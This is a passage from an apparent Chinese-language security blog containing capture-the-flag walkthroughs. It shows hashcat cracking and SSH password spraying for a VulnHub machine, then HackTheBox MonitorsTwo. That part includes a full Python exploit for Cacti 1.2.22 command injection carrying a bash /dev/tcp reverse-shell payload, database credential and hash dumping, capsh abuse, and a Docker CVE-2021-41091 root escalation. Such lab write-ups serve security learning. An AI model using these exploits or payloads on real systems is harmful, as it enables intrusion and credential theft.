9c42a1346e333a770904b2a2b37fa7d3 || bruce@localhost.localdomain   | 3a24d81c2b9d0d9aaf2f10c6c9757d4e || neil@localhost.localdomain    | 4773408d5358875b3764db552a29ca61 || charles@localhost.localdomain | b2a97bcecbd9336b98d59d9324dae5cf || foo@bar.com                   | 4cb9c8a8048fd02294477fcb1a41191a || 1@1.com                       | c4ca4238a0b923820dcc509a6f75849b || test@nowhere.com              | 098f6bcd4621d373cade4e832627b4f6 |+-------------------------------+----------------------------------+13 rows in set (0.00 sec)\n\n将这些凭证用sed与awk处理后，将hash值直接丢到hashcat中破解。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ hashcat -a 0 -m 0 passhash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]==================================================================================================================================================* Device #1: pthread-sandybridge-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2913/5890 MB (1024 MB allocatable), 8MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Hashes: 12 digests; 12 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Early-Skip* Not-Salted* Not-Iterated* Single-Salt* Raw-HashATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory required for this attack: 2 MBDictionary cache built:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344392* Bytes.....: 139921507* Keyspace..: 14344385* Runtime...: 4 secsed2539fe892d2c52c42a440354e8e3d5:madrid                   4cb9c8a8048fd02294477fcb1a41191a:changeme                 5d93ceb70e2bf5daa84ec3d0cd2c731a:qwer1234                 098f6bcd4621d373cade4e832627b4f6:test                     b2a97bcecbd9336b98d59d9324dae5cf:chuck33                  2146bf95e8929874fc63d54f50f1d2e3:turtles77                9c42a1346e333a770904b2a2b37fa7d3:somepassword             e22f07b17f98e0d9d364584ced0e3c18:my2cents                 Cracking performance lower than expected?                 * Append -O to the commandline.  This lowers the maximum supported password/salt length (usually down to 32).* Append -w 3 to the commandline.  This can cause your screen to lag.* Append -S to the commandline.  This has a drastic speed impact but can be better for specific attacks.  Typical scenarios are a small wordlist but a large ruleset.* Update your backend API runtime / driver the right way:  https://hashcat.net/faq/wrongdriver* Create more work items to make use of your parallelization power:  https://hashcat.net/faq/moreworkApproaching final keyspace - workload adjusted.                                                                     Session..........: hashcatStatus...........: ExhaustedHash.Mode........: 0 (MD5)Hash.Target......: passhashTime.Started.....: Wed May  3 14:34:10 2023 (6 secs)Time.Estimated...: Wed May  3 14:34:16 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:  2728.7 kH/s (0.22ms) @ Accel:512 Loops:1 Thr:1 Vec:8Recovered........: 8/12 (66.67%) Digests (total), 8/12 (66.67%) Digests (new)Progress.........: 14344385/14344385 (100.00%)Rejected.........: 0/14344385 (0.00%)Restore.Point....: 14344385/14344385 (100.00%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: $HEX[206b72697374656e616e6e65] -&gt; $HEX[042a0337c2a156616d6f732103]Hardware.Mon.#1..: Util: 28%Started: Wed May  3 14:33:41 2023Stopped: Wed May  3 14:34:17 2023\n\n我们用这些凭证进行密码喷洒攻击。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo crackmapexec ssh 192.168.56.141 -u username -p pass --continue-on-success | grep +SSH         192.168.56.141  22     192.168.56.141   [+] brian:my2cents SSH         192.168.56.141  22     192.168.56.141   [+] alice:turtles77 SSH         192.168.56.141  22     192.168.56.141   [+] leon:qwer1234 SSH         192.168.56.141  22     192.168.56.141   [+] julia:madrid SSH         192.168.56.141  22     192.168.56.141   [+] michael:somepassword SSH         192.168.56.141  22     192.168.56.141   [+] charles:chuck33\n\n非常OK。\n","categories":["vulnhub"],"tags":["walkthrough"]},{"title":"[HTB]  MonitorsTwo","url":"/2023/07/18/MonitorsTwo/","content":"\n\n\n前言六花可爱捏。挺简单的一台靶机，适合新手入坑尝试。\n信息收集nmap$ sudo nmap -p- --min-rate=10000 10.10.11.211Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 02:44 EDTNmap scan report for 10.10.11.211Host is up (0.092s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 7.69 seconds$ sudo nmap -sT -sV -sC -O -p22,80 10.10.11.211Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 02:45 EDTNmap scan report for 10.10.11.211Host is up (0.075s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Login to CactiWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.50 seconds$ sudo nmap --script=vuln 10.10.11.211Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 02:45 EDTPre-scan script results:| broadcast-avahi-dos:|   Discovered hosts:|     224.0.0.251|   After NULL UDP avahi packet DoS (CVE-2011-1002).|_  Hosts are all up (not vulnerable).Nmap scan report for 10.10.11.211Host is up (0.078s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  http|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-sql-injection:|   Possible sqli for queries:|     http://10.10.11.211:80/include/js/dygraph-combined.js?b5b448f71f8c3eb4a39506299bd81b0c=%27%20OR%20sqlspider|     http://10.10.11.211:80/include/js/jquery.tablesorter.pager.js?8ca32d30195c98492cd028f582f07c8c=%27%20OR%20sqlspider|     http://10.10.11.211:80/include/js/d3.js?62b21cab0960a061cb893852bfc74cfa=%27%20OR%20sqlspider|_    http://10.10.11.211:80/include/js/billboard.js?9a354b4a145f51a33bd39f8e5f042a23=%27%20OR%20sqlspider|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| http-enum:|_  /docs/: Potentially interesting folderNmap done: 1 IP address (1 host up) scanned in 241.70 seconds\n\n开了22和80，看标题80应该是Cacti登录页面，其他就是扫出了一个&#x2F;docs目录可以看一下，报的sql注入漏洞显然不太像，可以不用看。\nwhatweb$ sudo whatweb 10.10.11.211http://10.10.11.211 [200 OK] Cacti, Cookies[Cacti], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[Cacti], IP[10.10.11.211], JQuery, PHP[7.4.33], PasswordField[login_password], Script[text/javascript], Title[Login to Cacti], UncommonHeaders[content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.4.33], X-UA-Compatible[IE=Edge], nginx[1.18.0]\n\n扫出来可以看出网站是基于php的，并且nginx版本也不是最新的，可能有漏洞但是可以利用的可能性较小，懒得试了。\nniktosudo nikto -h 10.10.11.211- Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          10.10.11.211+ Target Hostname:    10.10.11.211+ Target Port:        80+ Start Time:         2023-07-18 03:03:35 (GMT-4)---------------------------------------------------------------------------+ Server: nginx/1.18.0 (Ubuntu)+ /: Retrieved x-powered-by header: PHP/7.4.33.+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?+ ///etc/hosts: The server install allows reading of any system file by adding an extra &#x27;/&#x27; to the URL.+ /install/install.php: Install file found.+ /help.php: A help file was found.+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.+ /wordpress/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.+ /wordpress/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.+ /wordpress/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.+ /shell?cat+/etc/hosts: A backdoor was identified.+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.+ /README.md: Readme Found.+ 8881 requests: 0 error(s) and 19 item(s) reported on remote host+ End Time:           2023-07-18 03:16:07 (GMT-4) (752 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\nnikto疑似扫出来不少后门或者文件包含啥的，实际上都用不了，接着往下走吧，没必要在这硬磕。\nweb渗透服务识别那就先打开网页看一眼吧。\n\n啥也没有，简简单单一个登录框，试了几个弱密码没有成功。\n但是登录框底部告诉我们这是用版本号为1.2.22的Cacti搭建的。我们直接google一下看看这是个啥。在这个网页上找到了相关资料。\n\n\nCacti 在英文中的意思是仙人掌的意思，Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。它通过snmpget来获取数据，使用 RRDtool绘画图形，而且你完全可以不需要了解RRDtool复杂的参数。它提供了非常强大的数据和用户管理功能，可以指定每一个用户能查看树状结构、host以及任何一张图，还可以与LDAP结合进行用户验证，同时也能自己增加模板，功能非常强大完善。Cacti 的发展是基于让 RRDTool 使用者更方便使用该软件，除了基本的 Snmp 流量跟系统资讯监控外，Cacti 也可外挂 Scripts 及加上 Templates 来作出各式各样的监控图。\ncacti是用php语言实现的一个软件，它的主要功能是用snmp服务获取数据，然后用rrdtool储存和更新数据，当用户需要查看数据的时候用rrdtool生成图表呈现给用户。因此，snmp和rrdtool是cacti的关键。Snmp关系着数据的收集，rrdtool关系着数据存储和图表的生成。\n\n我们大致有了一个了解，总之直接图穷匕见，搜一下cacti exploit。\nCacti RCEexp-db上就有一个Cacti-v1.2.22的RCE利用EXP，试了一下没利用成功。另请高就，在github上又找到一个能绕过登录并执行RCE的exp。\nimport requestsimport urllib.parsedef checkVuln():    result = requests.get(vulnURL, headers=header)    return (result.text != &quot;FATAL: You are not authorized to use this service&quot; and result.status_code == 200)def bruteForce():    # brute force to find host id and local data id    for i in range(1, 5):        for j in range(1, 10):            vulnIdURL = f&quot;&#123;vulnURL&#125;?action=polldata&amp;poller_id=1&amp;host_id=&#123;i&#125;&amp;local_data_ids[]=&#123;j&#125;&quot;            result = requests.get(vulnIdURL, headers=header)                if result.text != &quot;[]&quot;:                # print(result.text)                rrdName = result.json()[0][&quot;rrd_name&quot;]                if rrdName == &quot;polling_time&quot; or rrdName == &quot;uptime&quot;:                    return True, i, j    return False, -1, -1def remoteCodeExecution(payload, idHost, idLocal):    encodedPayload = urllib.parse.quote(payload)    injectedURL = f&quot;&#123;vulnURL&#125;?action=polldata&amp;poller_id=;&#123;encodedPayload&#125;&amp;host_id=&#123;idHost&#125;&amp;local_data_ids[]=&#123;idLocal&#125;&quot;        result = requests.get(injectedURL,headers=header)    print(result.text)if __name__ == &quot;__main__&quot;:    targetURL = input(&quot;Enter the target address (like &#x27;http://123.123.123.123:8080&#x27;)&quot;)    vulnURL = f&quot;&#123;targetURL&#125;/remote_agent.php&quot;    # X-Forwarded-For value should be something in the database of Cacti    header = &#123;&quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;&#125;    print(&quot;Checking vulnerability...&quot;)    if checkVuln():        print(&quot;App is vulnerable&quot;)        isVuln, idHost, idLocal = bruteForce()        print(&quot;Brute forcing id...&quot;)        # RCE payload        ipAddress = &quot;192.168.1.15&quot;        ipAddress = input(&quot;Enter your IPv4 address&quot;)        port = input(&quot;Enter the port you want to listen on&quot;)        payload = f&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&#123;ipAddress&#125;/&#123;port&#125; 0&gt;&amp;1&#x27;&quot;        if isVuln:            print(&quot;Delivering payload...&quot;)            remoteCodeExecution(payload, idHost, idLocal)        else:            print(&quot;RRD not found&quot;)    else:        print(&quot;Not vulnerable&quot;)\n\n直接跑一下试试。\n$ python exp.pyEnter the target address (like &#x27;http://123.123.123.123:8080&#x27;)http://10.10.11.211Checking vulnerability...App is vulnerableBrute forcing id...Enter your IPv4 address &lt;YOUR_IP&gt;Enter the port you want to listen on &lt;YOUR_PORT&gt;Delivering payload...&lt;html&gt;&lt;head&gt;&lt;title&gt;504 Gateway Time-out&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;504 Gateway Time-out&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;center&gt;nginx/1.18.0 (Ubuntu)&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;\n\n本地nc监听一下就拿到shell了。\n$ sudo nc -nlvp 443listening on [any] 443 ...connect to [HTB_IP] from (UNKNOWN) [10.10.11.211] 49612bash: cannot set terminal process group (1): Inappropriate ioctl for devicebash: no job control in this shellwww-data@50bca5e748b0:/var/www/html$ \n\n提权思路构建然而还不能高兴太早。高高兴兴跑去home目录下找user flag就会发现home目录是空的。我们直接看一下/etc/passwd就会发现除了root没人有bash环境以及home目录。\nwww-data@50bca5e748b0:/home$ cat /etc/passwdcat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n\n为啥呢？其实看一下主机名称一段无意义字符串+没有其他用户我们不难猜出其实我们处于docker环境中。我们的反弹shell是利用Cacti的漏洞获取的，如果Cacti是部署在docker上 的，那么我们的shell是从docker反弹出来的就是自然而然的了。\n那我们此时的shell毫无意义了吗？并不是，我们知道，网站部署起来要和后端交互，数据一般来说是要保存在数据库中的。并且我们的网页还是个登录页面，数据库里肯定存有用户的登录凭证，如果存在凭证复用的情况，那我们要拿到外面的shell也就有了路径。\n拿到user权限思路已经构建，那我们接下来就执行。要找数据库怎么找？当然是直接去看网页的配置文件了。我们查一下就能发现cacti的网站配置文件在/include/config.php中，那我们直接进行一个文件的看。\nwww-data@50bca5e748b0:/var/www/html/include$ cat config.phpcat config.php&lt;?php/* +-------------------------------------------------------------------------+ | Copyright (C) 2004-2020 The Cacti Group                                 | |                                                                         | | This program is free software; you can redistribute it and/or           | | modify it under the terms of the GNU General Public License             | | as published by the Free Software Foundation; either version 2          | | of the License, or (at your option) any later version.                  | |                                                                         | | This program is distributed in the hope that it will be useful,         | | but WITHOUT ANY WARRANTY; without even the implied warranty of          | | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           | | GNU General Public License for more details.                            | +-------------------------------------------------------------------------+ | Cacti: The Complete RRDtool-based Graphing Solution                     | +-------------------------------------------------------------------------+ | This code is designed, written, and maintained by the Cacti Group. See  | | about.php and/or the AUTHORS file for specific developer information.   | +-------------------------------------------------------------------------+ | http://www.cacti.net/                                                   | +-------------------------------------------------------------------------+*//* * Make sure these values reflect your actual database/host/user/password */$database_type     = &#x27;mysql&#x27;;$database_default  = &#x27;cacti&#x27;;$database_hostname = &#x27;db&#x27;;$database_username = &#x27;root&#x27;;$database_password = &#x27;root&#x27;;$database_port     = &#x27;3306&#x27;;$database_retries  = 5;$database_ssl      = false;$database_ssl_key  = &#x27;&#x27;;$database_ssl_cert = &#x27;&#x27;;$database_ssl_ca   = &#x27;&#x27;;$database_persist  = false;/* * When the cacti server is a remote poller, then these entries point to * the main cacti server. Otherwise, these variables have no use and * must remain commented out. */#$rdatabase_type     = &#x27;mysql&#x27;;#$rdatabase_default  = &#x27;cacti&#x27;;#$rdatabase_hostname = &#x27;localhost&#x27;;#$rdatabase_username = &#x27;cactiuser&#x27;;#$rdatabase_password = &#x27;cactiuser&#x27;;#$rdatabase_port     = &#x27;3306&#x27;;#$rdatabase_retries  = 5;#$rdatabase_ssl      = false;#$rdatabase_ssl_key  = &#x27;&#x27;;#$rdatabase_ssl_cert = &#x27;&#x27;;#$rdatabase_ssl_ca   = &#x27;&#x27;;\n\n文件的前面部分就给了我们想要的足够的信息：数据库的登录用户和密码。\n那我们就高高兴兴的登录，却发现会报错。\nwww-data@50bca5e748b0:/sbin$ mysql -uroot -pmysql -uroot -pEnter password: rootERROR 2002 (HY000): Can&#x27;t connect to local MySQL server through socket &#x27;/run/mysqld/mysqld.sock&#x27; (2)\n\n其实仔细一点就会发现，配置文件里面说明了$database_hostname = &#39;db&#39;;，我们要用的数据库hostname是db，要明确指定出来，否则会用默认的hostname也就是localhost，而配置文件配置了localhost为远程使用，本地登不了。指定了就能登了。\nwww-data@50bca5e748b0:/sbin$ mysql --host=db -uroot -prootmysql --host=db -uroot -prootshow databases;exitDatabaseinformation_schemacactimysqlperformance_schemasys\n\n然而登上去了还会有问题，我们输了命令之后没回显，只有再退出时才会有回显，这是因为当前shell环境交互有问题，无法正常的交互。而且机子内没有python环境，不能生成一个交互性更好的shell。所以我们要用非交互式查询。这个平时基本上谁不用交互式啊，非交互式咋弄的请教一下chatgpt吧。\n\n我们用-e选项就行。那就直接开查：\nwww-data@50bca5e748b0:/sbin$ mysql --host=db -uroot -proot -e &quot;show tables&quot; cacti&lt;ysql --host=db -uroot -proot -e &quot;show tables&quot; cactiTables_in_cactiaggregate_graph_templatesaggregate_graph_templates_graphaggregate_graph_templates_itemaggregate_graphsaggregate_graphs_graph_itemaggregate_graphs_itemsautomation_devicesautomation_graph_rule_itemsautomation_graph_rulesautomation_ipsautomation_match_rule_itemsautomation_networksautomation_processesautomation_snmpautomation_snmp_itemsautomation_templatesautomation_tree_rule_itemsautomation_tree_rulescdefcdef_itemscolor_template_itemscolor_templatescolorsdata_debugdata_inputdata_input_datadata_input_fieldsdata_localdata_source_profilesdata_source_profiles_cfdata_source_profiles_rradata_source_purge_actiondata_source_purge_tempdata_source_stats_dailydata_source_stats_hourlydata_source_stats_hourly_cachedata_source_stats_hourly_lastdata_source_stats_monthlydata_source_stats_weeklydata_source_stats_yearlydata_templatedata_template_datadata_template_rrdexternal_linksgraph_localgraph_template_inputgraph_template_input_defsgraph_templatesgraph_templates_gprintgraph_templates_graphgraph_templates_itemgraph_treegraph_tree_itemshosthost_graphhost_snmp_cachehost_snmp_queryhost_templatehost_template_graphhost_template_snmp_queryplugin_configplugin_db_changesplugin_hooksplugin_realmspollerpoller_commandpoller_data_template_field_mappingspoller_itempoller_outputpoller_output_boostpoller_output_boost_local_data_idspoller_output_boost_processespoller_output_realtimepoller_reindexpoller_resource_cachepoller_timeprocessesreportsreports_itemssessionssettingssettings_treesettings_usersettings_user_groupsitessnmp_querysnmp_query_graphsnmp_query_graph_rrdsnmp_query_graph_rrd_svsnmp_query_graph_svsnmpagent_cachesnmpagent_cache_notificationssnmpagent_cache_textual_conventionssnmpagent_managerssnmpagent_managers_notificationssnmpagent_mibssnmpagent_notifications_loguser_authuser_auth_cacheuser_auth_groupuser_auth_group_membersuser_auth_group_permsuser_auth_group_realmuser_auth_permsuser_auth_realmuser_domainsuser_domains_ldapuser_logvdefvdef_itemsversion\n\n我们显然对usr_auth表感兴趣，查他\nwww-data@50bca5e748b0:/sbin$ mysql --host=db -uroot -proot -e &quot;select * from user_auth&quot; cacti&lt;db -uroot -proot -e &quot;select * from user_auth&quot; cactiid      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview   graph_settings   login_opts      policy_graphs   policy_trees    policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history       locked   failed_attempts lastfail        reset_perms1       admin   $2y$10$u8Xomk2jjbuJI3MW5TudHeytPPuaWYuNs2S2bTtiD8VW0SIp2TMwe    0       Jamie Thompson  admin@monitorstwo.htb           on      on      on      on     on       2       1       1       1       1       on      -1      -1      -1              0       0       6633486553       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1              -1       -1      -1              0       0       04       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.************************    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on     on       1       1       1       1       1       on      -1      -1              on      0       0       2135691668\n\n发现3个用户的密码，丢去hashes网站去破解一下看看。\n\n我们发现了guest和marcus用户的密码，但是admin的没破解出来。那我们接着把admin的密码丢到john里破解一下。接着，我们用guest和marcus登录下网站，发现都登不进去，marcus密码对但是提示没权限访问。\n事已至此，试试ssh。我们可以发现marcus的密钥可以成功登录。\n$ ssh marcus@10.10.11.211The authenticity of host &#x27;10.10.11.211 (10.10.11.211)&#x27; can&#x27;t be established.ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;10.10.11.211&#x27; (ED25519) to the list of known hosts.marcus@10.10.11.211&#x27;s password:Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Tue 18 Jul 2023 08:22:44 AM UTC  System load:                      0.02  Usage of /:                       63.4% of 6.73GB  Memory usage:                     19%  Swap usage:                       0%  Processes:                        247  Users logged in:                  1  IPv4 address for br-60ea49c21773: 172.18.0.1  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1  IPv4 address for docker0:         172.17.0.1  IPv4 address for eth0:            10.10.11.211Expanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsYou have mail.Last login: Tue Jul 18 08:21:07 2023 from 10.10.14.58marcus@monitorstwo:~$ \n\n那直接在home目录下拿下user flag。\nroot权限拿下了user flag自然很高兴，但是高兴之余别忘了一些细节。比如千万别养成ssh登进来就直接clear清屏的习惯。motd提示当前用户有邮件。那我们真得看看，邮件经常会泄露信息，不得不品尝。mail的目录在&#x2F;var&#x2F;mail。\nmarcus@monitorstwo:/var/mail$ cat marcusFrom: administrator@monitorstwo.htbTo: all@monitorstwo.htbSubject: Security Bulletin - Three Vulnerabilities to be Aware OfDear all,We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.Best regards,AdministratorCISOMonitor TwoSecurity Team\n\n上来就给我们报了3个CVE。大致看了下介绍，CVE-2021-33033是linux内核漏洞的利用，我们uname -a可以看到当前内核版本是5.4，但是内核提权稳定性让我们先不去考虑它。CVE-2020-25706是cacti的xss漏洞，提权用不上，不看。CVE-2021-41091是Moby（一种docker引擎）的漏洞，我们查了一下发现可以用于提权。github上有详细的PoC介绍,那我们按照说明尝试下利用。\nCVE-2021-41091\n第一步是要获取docker内的root权限并将内部的/bin/bash设置s位权限。\n聪明的我们之前的反弹shell并没关。那docker内提权也还是同一个思路，先三板斧：sudo -l没权限，find / -type f -perm -04000 2&gt;/dev/null这次支棱起来了：\nwww-data@50bca5e748b0:/var/www/html$ find / -type f -perm -04000 2&gt;/dev/nullfind / -type f -perm -04000 2&gt;/dev/null/usr/bin/gpasswd/usr/bin/passwd/usr/bin/chsh/usr/bin/chfn/usr/bin/newgrp/sbin/capsh/bin/mount/bin/umount/bin/bash/bin/su\n\n我们可以发现有个capsh不是很熟悉，其他都是老演员了。我们直接去gtfobins上查capsh的户口，发现其有利用方式./capsh --gid=0 --uid=0 --，那直接来吧。\nwww-data@50bca5e748b0:/var/www/html$ cd /sbincd /sbinwww-data@50bca5e748b0:/sbin$ ./capsh --gid=0 --uid=0 --./capsh --gid=0 --uid=0 --whoamirootchmod u+s /bin/bashls -la /bin/bash-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash\n\n第一步搞定。\n\n第二步就是执行我们的EXP。exp.sh直接从github复制或者下载下来都行。\nmarcus@monitorstwo:/tmp$ ./exp.sh[!] Vulnerable to CVE-2021-41091[!] Now connect to your Docker container that is accessible and obtain root access ![&gt;] After gaining root access execute this command (chmod u+s /bin/bash)Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes[!] Available Overlay2 Filesystems:/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged[!] Iterating over the available Overlay2 filesystems ![?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged[x] Could not get root access in &#x27;/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged&#x27;[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged[!] Rooted ![&gt;] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged[?] If it didn&#x27;t spawn a shell go to this path and execute &#x27;./bin/bash -p&#x27;[!] Spawning Shellbash-5.1# exitmarcus@monitorstwo:/tmp$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/mergedmarcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -pbash-5.1# whoamirootbash-5.1#  cd /rootbash-5.1# ls -latotal 36drwx------  6 root root 4096 Mar 22 13:21 .drwxr-xr-x 19 root root 4096 Mar 22 13:21 ..lrwxrwxrwx  1 root root    9 Jan 20  2021 .bash_history -&gt; /dev/null-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrcdrwx------  2 root root 4096 Mar 22 